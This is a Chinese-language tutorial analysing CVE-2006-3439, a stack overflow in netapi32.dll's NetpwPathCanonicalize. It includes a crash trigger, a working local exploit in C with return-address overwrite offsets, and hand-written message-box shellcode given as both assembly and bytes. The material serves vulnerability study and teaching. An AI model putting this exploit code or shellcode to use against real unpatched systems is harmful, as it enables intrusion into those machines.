通过IDA Pro加载netapi32.dll动态链接库，来进行分析CVE-2006-3439漏洞产生的原理。

![](https://image.3001.net/images/20220427/1651033584_6268c5f00d4c214f077e5.png!small)通过IDA全局搜索函数功能，直接搜索存在问题的NetpwPathCanonicalize函数，双击进行跳转到NetpwPathCanonicalize函数位置。![](https://image.3001.net/images/20220427/1651033584_6268c5f09f1f1512c0121.png!small)

通过动态分析可以知道漏洞点发生在下图中CALL中。![](https://image.3001.net/images/20220427/1651033585_6268c5f170516232ef147.png!small)

看到在开始sub esp,414h进行开辟栈空间，它是用来存储拼接后的字符串。mov
ebx，411h进行边界检查，查看数据是否溢出。漏洞产生原因主要处在wcslen上，wcslen主要是对字符进行计算，类似于strlen函数，区别在于wcslen计算的是WCHAR类型，在栈空间中内容都是以字节作为计算，用的是ASCII编码，而wcslen使用的是Unicode编码，用的是两个字节，就是同样长度的字符串会少算了一半。前面他检查分411h但是我们可以传入822h字节，这个是十六进制的。

![](https://image.3001.net/images/20220427/1651033585_6268c5f1db91308f0bfd9.png!small)

看到cmp ax，5ch他就是动态分析时候进行拼接/。call edi计算path路径的Unicode长度，结果保存到了eax当中，下边add
eax，esi是把两个字符串拼接后大小存到eax当中，第二次边界检查依然是通过0x411进行检查，但是它存在问题。上边prefix不能利用是因为他在外边进行了二次检查，而path是可以利用的，因为没有对他进行检查，以此可以知道path是可以传超长字符串，最长可达411h的二倍。因为这里检查的还是Unicode编码而不是ASCII编码。运行下边函数他会把path拼接到prefix后面，长度已超过开辟的414h长度，所以造成溢出可以进行利用。

![](https://image.3001.net/images/20220427/1651033586_6268c5f265668a5c2e5ee.png!small)

## CVE-2006-3439漏洞动态分析

CVE-2006-3439漏洞有补丁号为KB921883，如果计算机没有打此补丁，此漏洞就可以利用。

    
    
    #include
    typedef void (*MYPROC)(LPTSTR);
    int main()
    {  
    char path[0x320];
    char can_path[0x440];
    int maxbuf=0x440;
    char prefix[0x100];
    long pathtype=44;
    //load vulnerability netapi32.dll which we got from a WIN2K sp4 host 
    HINSTANCE LibHandle;
    MYPROC Trigger;
    char dll[ ] = "./netapi32.dll"; // care for the path
    char VulFunc[ ] = "NetpwPathCanonicalize";
    LibHandle = LoadLibrary(dll);
    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);
    memset(path,0,sizeof(path));
    memset(path,'a',sizeof(path)-2);
    memset(prefix,0,sizeof(prefix));
    memset(prefix,'b',sizeof(prefix)-2);
    //__asm int 3
    (Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
    FreeLibrary(LibHandle);
    }

此漏洞出现在netapi32.dll动态链接库中，是NetpwPathCanonicalize函数出现了问题，该函数本身是一个网络路径字符串格式化的函数，Unicode编码字符串处理功能。(Trigger)(path,can_path,maxbuf,prefix
,&pathtype,0);首先会先看prefix 参数是不是buffer，如果这个buffer不是空的，那么就把prefix
里面的内容和path路径里的内容通过一个反斜杠连接起来，连接起来会把他们放到can_path里面。

如果prefix
和path越界了或不够大就有可能直接退出。netapi32.dll动态链接库是微软的一个系统库，可以进行远程利用。通过memset对path和prefix进行了初始化，首先初始化成了0在对两个buffer分别用a和b进行覆盖。因为netapi32.dll动态链接库中NetpwPathCanonicalize函数存在问题，所以通过使用GetProcAddress方式拿到他的地址。

运行代码他会直接崩掉，可以看到Offset:
61616161是他的溢出地址，正常溢出不会出现这种地址，61是ASCII中a的编码，所以说返回地址被其中一个buffer给覆盖掉了。

![](https://image.3001.net/images/20220427/1651033586_6268c5f2cff8da7e5b800.png!small)接下来进行动态分析，首先打开生成的Release可执行文件中把NETAPI32.DLL放进去，因为代码中调用NETAPI32.DL是以相对路径调用的。![](https://image.3001.net/images/20220427/1651033587_6268c5f333783259f37f5.png!small)

刚进来他是处在系统模块中，直接F9进入到我们程序当中。

![](https://image.3001.net/images/20220427/1651033587_6268c5f37968bb825f079.png!small)看到0040119F地址call
ms_06_040.401000就是分析程序的主函数。主函数有三个参数，通过特征可以看他调用call之前进行了三次push，他使用的调用约定是stdcall，stdcall参数从右至左的顺序压参数入栈。stdcall和cdecl调用约定都是从右至左的顺序压参数入栈，区别在于stdcall需要通过add进行手动平栈而cdecl由系统平栈。

![](https://image.3001.net/images/20220427/1651033587_6268c5f3d6494ffbcb04d.png!small)此漏洞问题出现在call
edx当中。call edx是一个经典的函数指针，因为在编译的时候edx地址还不确定，它是后覆盖进去的。

![](https://image.3001.net/images/20220427/1651033588_6268c5f45a82765c5972d.png!small)直接F8或F9往下走，可以看到它的EBP和EIP都是61616161，说明EBP和EIP都被其中一个buffer给覆盖了

![](https://image.3001.net/images/20220427/1651033588_6268c5f4c6919a4bb012e.png!small)因为他call
edx，在寄存器中可以看到edx他其实就是有漏洞的API函数。

![](https://image.3001.net/images/20220427/1651033589_6268c5f5492763a40de77.png!small)直接把edx的地址取出来，ctrl+G跳到NetpwPathCanonicalize里去。

![](https://image.3001.net/images/20220427/1651033589_6268c5f5bea254a9a4a79.png!small)第一次分析的话就要一步一步往下走，看他在哪一个call下飞了，然后就进去分析那个call，过程不做演示，此次直接定位到问题函数进行分析。

![](https://image.3001.net/images/20220427/1651033590_6268c5f622056af3e3734.png!small)进入到netapi32.dll中发现sub
esp,414，开辟了一块很大的空间。mov edi,dword ptr ds:[<&wcslen>]计算了一下长度，其实就是做了一个验证。

![](https://image.3001.net/images/20220427/1651033590_6268c5f689e1437df2b1f.png!small)发现它存在&wcscpy和&wcscat，问题就出现在&wcscat上。wcscpy作用是拷贝字符串到栈里面去。

![](https://image.3001.net/images/20220427/1651033591_6268c5f7365038ac22a40.png!small)首先call
dword ptr
ds:[<&wcscpy>]进行了call，可以看到他的参数是从eax来的，而eax值是从[ebp-414]来的，我们直接跳到ebp-414。

![](https://image.3001.net/images/20220427/1651033591_6268c5f790caaa0b1b507.png!small)通过右键->在内存窗口中转到->转到ebp-414位置。

![](https://image.3001.net/images/20220427/1651033591_6268c5f7e288baf55d9a5.png!small)

可以看到内存中一大片62，最后有两个00，这个00是初始化时候故意留的两个，进行了-2操作，有了0000结尾他就是Unicode编码字符串结尾了。

![](https://image.3001.net/images/20220427/1651033592_6268c5f83ff92fd8a860e.png!small)

单步程序到7517FCCC位置他还没有出现问题。

![](https://image.3001.net/images/20220427/1651033592_6268c5f8a7cca0b8f8c58.png!small)在执行一步发现0000没有了，其中一个00被5C覆盖了，所以这个就是拼接进去一个/，因为这个拼接进去/，导致00被覆盖，以此这个字符串没有了结尾。

![](https://image.3001.net/images/20220427/1651033593_6268c5f92303f0de40a58.png!small)在此wcscat下边还存有一个wcscat，直接跳转过去。

![](https://image.3001.net/images/20220427/1651033593_6268c5f98417966cbacc3.png!small)

通过观察内存窗口结尾，目前还是5C00,执行完第二个wcscat他会发生改变。

![](https://image.3001.net/images/20220427/1651033593_6268c5f9ed69fea36abe5.png!small)

可以看到wcscat把a拼接到了后面，而且他没有了0000结束，这个字符串是没有断开的，这么复制过来后就出现了问题。这就是他溢出的一个基本原因。可以看到是61把path路径串给覆盖了。![](https://image.3001.net/images/20220427/1651033594_6268c5fa64d843e5843fd.png!small)

通过这个可以知道0012F6A8就是EBP，下边0012F6AC就是返回地址，0012F294为buffer的起始地址。

![](https://image.3001.net/images/20220427/1651033594_6268c5fac841b934e729a.png!small)在ret结束位置下断点跳转过去，返回地址是0012F6AC，ECX是0012F294为buffer的起始地。所以就可以把prefix或跟path一部分空间直接设置成shellcode。

![](https://image.3001.net/images/20220427/1651033595_6268c5fb1e76414fcf70a.png!small)

利用immunity debugger工具mona,在命令行输入!mona find -s "\xFF\xD1" -m
netapi32.dll，此命令意思通过mona查找指定指令call
ECS和指定模块netapi32.dll。结果可以看到有很多地址，目前只记0x751852F9和0x7518AE6C两个地址。

![](https://image.3001.net/images/20220427/1651033595_6268c5fb96e43b305da55.png!small)计算返回地址到起始地址距离，返回地址0012F6AC-0012F294起始地址=0x418
- prefix的100字节 = 0x318，所以就要在0x318的位置上把返回地址进行淹没。

    
    
    #include
    typedef void (*MYPROC)(LPTSTR);
    
    char shellcode[]=
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x6F\x70\x20\x20\x68\x76\x75\x6c\x74\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
    
    int main()
    {  
    char path[0x320];
    char can_path[0x440];
    int maxbuf=0x440;
    char prefix[0x100];
    long pathtype=44;
    //load vulnerability netapi32.dll which we got from a WIN2K sp4 host 
    HINSTANCE LibHandle;
    MYPROC Trigger;
    char dll[ ] = "./netapi32.dll"; // care for the path
    char VulFunc[ ] = "NetpwPathCanonicalize";
    LibHandle = LoadLibrary(dll);
    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);
    memset(path,0,sizeof(path));
    memset(path,0x90,sizeof(path)-2);
    memset(prefix,0,sizeof(prefix));
    memset(prefix,'b',sizeof(prefix)-2);
    memcpy(prefix,shellcode,168);
    //0x751852F9
    path[0x318] = 0xF9;
    path[0x319] = 0x52;
    path[0x31A] = 0x18;
    path[0x31B] = 0x75;
    //__asm int 3
    (Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
    FreeLibrary(LibHandle);
    }

通过mona已经获取到了两个地址0x751852F9和0x7518AE6C，通过计算算出要覆盖的地址0x318，以字节形式进行赋值把0x751852F9以小端序方式赋给0x318开始到0x31B位置。目前初始化a已经没有意义，进行全部初始化成0x90为not指令，插入一段shellcode通过memcpy(prefix,shellcode,168);命令，意思是把shellcode代码拷贝到prefix中一共是168个字节。

![](https://image.3001.net/images/20220427/1651033596_6268c5fc154a800578726.png!small)

重新编译完之后再次分析一下，跳到netapi32.dll返回地方可以看到，ESP地址为0x0012F6A8跳转到堆栈，地址是刚才设置的，ECX地址为0x0012F290栈中指向0x0A6A68FC这个就是shellcode的地址。

![](https://image.3001.net/images/20220427/1651033596_6268c5fc6c095aef0ada3.png!small)跳转之后发现发进行call
ecx，现在ecx地址就是shellcode的位置。

![](https://image.3001.net/images/20220427/1651033596_6268c5fce1016b20c302f.png!small)再次运行跳转到shellcode位置进行了弹窗。

![](https://image.3001.net/images/20220427/1651033597_6268c5fd5c2f997b32713.png!small)

## ShellCode编写

    
    
    void main()
    {
    _asm{
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    CLD
    push 0x1e380a6a
    push 0x4fd18963
    push 0x0c917432
    mov esi,esp
    lea edi,[esi-0xC]
    
    xor ebx,ebx
    mov bh,0x04
    sub esp,ebx
    
    mov bx,0x3233
    push ebx
    push 0x72657375
    push esp
    xor edx,edx
    
    mov ebx,fs:[edx + 0x30]
    mov ecx,[ebx + 0x0c]
    mov ecx,[ecx + 0x1c]
    mov ecx,[ecx]
    mov ebp,[ecx + 0x08]
    
    find_lib_functions:
    lodsd
    cmp eax,0x1e380a6a
    jne find_functions
    xchg eax,ebp
    call [edi - 0x8]
    xchg eax,ebp
    
    find_functions:
    pushad
    mov eax,[ebp + 0x3c]
    mov ecx,[ebp + eax + 0x78]
    add ecx,ebp
    mov ebx,[ecx + 0x20]
    add ebx,ebp
    xor edi,edi
    
    next_function_loop:
    inc edi
    mov esi,[ebx + edi * 4]
    add esi,ebp
    cdq
    
    hash_loop:
    movsx eax,byte ptr[esi]
    cmp al,ah
    jz compare_hash
    ror edx,7
    add edx,eax
    inc esi
    jmp hash_loop
    
    compare_hash:
    cmp edx,[esp + 0x1c]
    jnz next_function_loop
    mov ebx,[ecx + 0x24]
    add ebx,ebp
    mov di,[ebx + 2 * edi]
    mov ebx,[ecx + 0x1c]
    add ebx,ebp
    add ebp,[ebx + 4 * edi]
    xchg eax,ebp
    pop edi
    stosd
    push edi
    popad
    
    cmp eax,0x1e380a6a
    jne find_lib_functions
    
    function_call:
    xor ebx,ebx
    push ebx
    push 0x66666666
    push 0x66666666
    mov eax,esp
    push ebx
    push eax
    push eax
    push ebx
    call [edi - 0x04]
    push ebx
    call [edi - 0x08]
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    }
    }

把上边代码生成可执行文件，通过dbg打开找shellcode位置，下图为shellcode地址。

![](https://image.3001.net/images/20220427/1651033597_6268c5fdbc451b0f9b634.png!small)

进去看到上边写的shellcode进行复制，从cld到结尾带一个not，选择二进制复制。

![](https://image.3001.net/images/20220427/1651033598_6268c5fe4d4d169b070c6.png!small)

把复制出来的shellcode二进制以十六进制文本形成粘贴到010Editor，再以C代码形式复制出来。

    
    
    FC 68 6A 0A 38 1E 68 63 89 D1 4F 68 32 74 91 0C 8B F4 8D 7E F4 33 DB B7 04 2B E3 66 BB 33 32 53 68 75 73 65 72 54 33 D2 64 8B 5A 30 8B 4B 0C 8B 49 1C 8B 09 8B 69 08 AD 3D 6A 0A 38 1E 75 05 95 FF 57 F8 95 60 8B 45 3C 8B 4C 05 78 03 CD 8B 59 20 03 DD 33 FF 47 8B 34 BB 03 F5 99 0F BE 06 3A C4 74 08 C1 CA 07 03 D0 46 EB F1 3B 54 24 1C 75 E4 8B 59 24 03 DD 66 8B 3C 7B 8B 59 1C 03 DD 03 2C BB 95 5F AB 57 61 3D 6A 0A 38 1E 75 A9 33 DB 53 68 66 66 66 66 68 66 66 66 66 8B C4 53 50 50 53 FF 57 FC 53 FF 57 F8 90

![](https://image.3001.net/images/20220427/1651033598_6268c5fec7c65f4a648c3.png!small)

    
    
    unsigned char shellcode[] = {
    0xFC, 0x68, 0x6A, 0x0A, 0x38, 0x1E, 0x68, 0x63, 0x89, 0xD1, 0x4F, 0x68, 0x32, 0x74, 0x91, 0x0C,0x8B, 0xF4, 0x8D, 0x7E, 0xF4, 0x33, 0xDB, 0xB7, 0x04, 0x2B, 0xE3, 0x66, 0xBB, 0x33, 0x32, 0x53,0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x33, 0xD2, 0x64, 0x8B, 0x5A, 0x30, 0x8B, 0x4B, 0x0C, 0x8B,0x49, 0x1C, 0x8B, 0x09, 0x8B, 0x69, 0x08, 0xAD, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0x05, 0x95,0xFF, 0x57, 0xF8, 0x95, 0x60, 0x8B, 0x45, 0x3C, 0x8B, 0x4C, 0x05, 0x78, 0x03, 0xCD, 0x8B, 0x59,0x20, 0x03, 0xDD, 0x33, 0xFF, 0x47, 0x8B, 0x34, 0xBB, 0x03, 0xF5, 0x99, 0x0F, 0xBE, 0x06, 0x3A,0xC4, 0x74, 0x08, 0xC1, 0xCA, 0x07, 0x03, 0xD0, 0x46, 0xEB, 0xF1, 0x3B, 0x54, 0x24, 0x1C, 0x75,0xE4, 0x8B, 0x59, 0x24, 0x03, 0xDD, 0x66, 0x8B, 0x3C, 0x7B, 0x8B, 0x59, 0x1C, 0x03, 0xDD, 0x03,0x2C, 0xBB, 0x95, 0x5F, 0xAB, 0x57, 0x61, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0xA9, 0x33, 0xDB,0x53, 0x68, 0x66, 0x66, 0x66, 0x66, 0x68, 0x66, 0x66, 0x66, 0x66, 0x8B, 0xC4, 0x53, 0x50, 0x50,0x53, 0xFF, 0x57, 0xFC, 0x53, 0xFF, 0x57, 0xF8, 0x90
    };

## CVE-2006-3439远程利用

![](https://image.3001.net/images/20220427/1651033599_6268c5ff2097fa69abb95.png!small)受害者

![](https://image.3001.net/images/20220427/1651033599_6268c5ff68719146346a9.png!small)攻击者

![](https://image.3001.net/images/20220427/1651033599_6268c5ffd1cccbeb160dd.png!small)

漏洞利用

![](https://image.3001.net/images/20220427/1651033600_6268c6006e714e3087964.png!small)

![](https://image.3001.net/images/20220427/1651033602_6268c6022a0e73c7e2be8.png!small)

  

